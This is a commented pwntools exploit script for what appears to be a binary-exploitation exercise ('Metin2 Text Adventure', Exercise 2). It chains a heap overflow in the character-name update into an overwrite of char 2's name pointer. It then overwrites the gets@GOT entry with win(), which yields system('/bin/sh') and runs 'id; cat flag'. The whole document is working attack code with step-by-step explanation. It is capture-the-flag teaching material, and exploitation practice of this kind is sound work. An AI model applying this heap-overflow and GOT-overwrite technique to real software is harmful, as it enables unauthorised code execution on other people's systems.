#!/usr/bin/env python3
from pwn import *

# =============================================================================
# CONFIGURATION
# =============================================================================
#
# Target binary: Metin2 Text Adventure (Exercise 2)
# This binary is *not* PIE, so function / GOT addresses are fixed.
#
# The vulnerability:
#   - There is a heap-based overflow when updating a character's name.
#   - The name of "character 1" lives in a heap chunk directly before
#     the struct for "character 2".
#   - By overflowing the name of character 1, we can overwrite the
#     *name pointer* inside character 2's struct.
#   - That name pointer is later passed to gets(), which lets us write
#     arbitrary data anywhere in memory.
#   - We choose to overwrite the GOT entry of gets() with the address
#     of win(), which internally calls system(cmd).
#   - Finally, we call the name-update function again on character 1,
#     which now calls win(name_of_char1) instead of gets(name_of_char1),
#     effectively executing system("/bin/sh #...").
#
# Overall strategy:
#   1. Create two characters (char 1 and char 2) so their heap chunks
#      are adjacent.
#   2. Use the name overflow on char 1 to overwrite char 2's name pointer
#      with &gets@GOT.
#   3. Use the name update on char 2 to overwrite gets@GOT with win().
#   4. Call the name update on char 1 again: the program calls "gets",
#      but GOT is patched, so win("/bin/sh #...") → system("/bin/sh #...").
#

exe = './bin/ex2'
elf = ELF(exe)

context.binary = elf
context.log_level = 'debug'  # set to 'info' for quieter output


# -----------------------------------------------------------------------------
# Process launcher
# -----------------------------------------------------------------------------
def start():
    """
    Start the target process.

    If run with:
        python3 solve_ex2.py GDB
    this will attach GDB with a helper script.

    Otherwise, it spawns a regular local process.

    We use a PTY for stdin/stdout to avoid any odd buffering behaviour when
    the binary prints prompts without newlines.
    """
    if args.GDB:
        return gdb.debug(
            exe,
            '''
            # Uncomment to break where the name update happens
            # b character_update_name
            continue
            '''
        )
    else:
        # Use PTY to make sendlineafter/recv* behave nicely with prompts
        return process(exe, stdin=process.PTY, stdout=process.PTY)


# =============================================================================
# EXPLOIT HELPERS
# =============================================================================

def create_char(io, class_idx, name: bytes):
    """
    Drive the menu to create a new character.

    Parameters:
        io         - the pwntools tube
        class_idx  - integer class ID (1..something)
        name       - bytes for the character name (controls heap data)

    Menu path:
        1) Create new character
        then choose class (1..5)
        then provide the name
    """
    io.sendlineafter(b"4. See your stats", b"1")
    io.sendlineafter(b"5. LYCAN", str(class_idx).encode())
    io.sendlineafter(b"Choose your name:", name)


def update_name(io, char_idx, new_name: bytes):
    """
    Drive the menu to update an existing character's name.

    Parameters:
        io        - the pwntools tube
        char_idx  - which character to update (1, 2, ...)
        new_name  - bytes that will be read by the vulnerable function

    Menu path:
        2) Change name
        then choose which character: "1, 2, or..."
        then provide the new name (this is where the overflow happens).
    """
    io.sendlineafter(b"4. See your stats", b"2")
    io.sendlineafter(b"Which one? 1, 2, or...", str(char_idx).encode())
    io.sendline(new_name)


# =============================================================================
# MAIN EXPLOIT
# =============================================================================

def solve():
    io = start()

    # -------------------------------------------------------------------------
    # Step 1: Create two characters
    # -------------------------------------------------------------------------
    #
    # On the heap, the game allocates a struct per character. The first
    # character's name buffer is allocated in a chunk right before the second
    # character's struct (or at least close enough that we can overflow into it).
    #
    # Char 1:
    #   - Will contain our "/bin/sh #" command in its name buffer.
    #   - Its name buffer is the source of the heap overflow.
    #
    # Char 2:
    #   - Is the *victim* whose "name pointer" we overwrite.
    #
    log.info("Step 1: Create two characters")
    create_char(io, 1, b"A")  # Character 1
    create_char(io, 1, b"B")  # Character 2

    # -------------------------------------------------------------------------
    # Step 2: Overflow char 1's name to overwrite char 2's name pointer
    # -------------------------------------------------------------------------
    #
    # Goal:
    #   - Overwrite Char 2's name pointer with the address of gets@GOT.
    #   - Place "/bin/sh #" at the start of Char 1's name buffer.
    #
    # Why?
    #   - Later, when we call the "change name" function on Char 2, the program
    #     will call gets(Char2->name). But Char2->name now points *to* gets@GOT,
    #     and gets() will write to that address. This gives us arbitrary write
    #     of an 8-byte value into gets@GOT.
    #
    # Layout approximation for the overflow:
    #   [Char1 name buffer .................]  (we can write more than its size)
    #   [Heap metadata (next chunk header)..]
    #   [Char2 struct: class, level, name_ptr]
    #
    # To patch Char2->name_ptr, we must write exactly:
    #       <shell_cmd> + <padding> + <p64(elf.got['gets'])>
    #
    # 'offset' is the number of bytes from the start of Char1's name buffer
    # to the field that stores Char2->name_ptr.
    #
    log.info("Step 2: Overflow Char 1 to overwrite Char 2's name pointer")

    offset = 40
    shell_cmd = b"/bin/sh #"  # '#' comments out anything after in /bin/sh

    # The first bytes of Char 1's name become "/bin/sh #".
    # Then we pad up until we reach Char 2's name pointer.
    padding = b"A" * (offset - len(shell_cmd))

    # At 'offset', we overwrite the pointer field with &gets@GOT.
    # This turns Char 2's name pointer into the GOT entry of gets().
    payload = shell_cmd + padding + p64(elf.got['gets'])

    # Use the vulnerable "change name" logic on character 1 to overflow into
    # character 2's struct and overwrite its name pointer.
    update_name(io, 1, payload)

    # -------------------------------------------------------------------------
    # Step 3: Overwrite gets@GOT with win()
    # -------------------------------------------------------------------------
    #
    # After Step 2:
    #   Char2->name == &gets@GOT
    #
    # When we update the name of Char 2, internally the game calls:
    #   gets(Char2->name);
    #
    # But Char2->name points *to* the GOT entry of gets. So gets() will write
    # whatever we send into that GOT entry. That gives us a clean 8-byte write:
    #
    #   gets@GOT := <our 8-byte payload>
    #
    # We choose <our 8-byte payload> to be the address of win().
    # In the binary, win(const char *cmd) eventually calls system(cmd), so
    # replacing gets() with win() means every "gets(buf)" turns into
    # "win(buf)" → "system(buf)".
    #
    log.info("Step 3: Overwrite gets@GOT with win()")

    update_name(io, 2, p64(elf.sym['win']))

    # -------------------------------------------------------------------------
    # Step 4: Trigger the shell
    # -------------------------------------------------------------------------
    #
    # At this point:
    #   - GOT entry of gets() has been overwritten with win().
    #
    # The "change name" function for a character still calls gets() in the
    # source code, but at runtime, the PLT stub for gets() will actually jump
    # to win().
    #
    # So when we call:
    #   update_name(io, 1, ...)
    #
    # the program executes:
    #   gets(Char1->name)  →  win(Char1->name)  →  system(Char1->name)
    #
    # But Char1->name *already* contains "/bin/sh #..." from Step 2.
    # That means we end up executing:
    #   system("/bin/sh #AAAAA...")
    #
    # The extra characters after '#' are treated as a comment by the shell.
    #
    # The argument we pass here (b"id; cat flag") is *not* used as a name
    # anymore – the function pointer in GOT no longer points to the real gets,
    # so the call to "gets" does not read from stdin in the normal way.
    # However, pwntools will still send it; it may become the first line
    # the new shell reads from stdin, which is convenient:
    #
    #   - shell starts with /bin/sh
    #   - its stdin already has "id; cat flag\n"
    #   - so the first command executed by the shell is exactly that.
    #
    log.info("Step 4: Trigger the Shell via patched gets@GOT → win()")

    update_name(io, 1, b"id; cat flag")

    # Drop to interactive shell so we can play manually if needed
    io.interactive()


if __name__ == "__main__":
    solve()

